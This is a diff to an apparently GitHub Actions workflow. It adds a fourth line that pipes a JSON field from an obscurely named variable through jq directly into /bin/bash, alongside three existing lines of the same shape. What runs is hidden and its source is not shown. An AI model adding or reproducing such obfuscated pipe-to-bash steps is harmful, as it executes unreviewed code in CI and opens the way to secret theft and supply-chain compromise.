@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$hgjr49430" | jq -r .oi2 | /bin/bash
           echo $yziyt80 | jq -r .forbv3 | /bin/bash
           printf '%s' "$tgt35700" | jq -r .oe41 | /bin/bash
+          printf '%s' "$qbkh6" | jq -r .zspq70 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
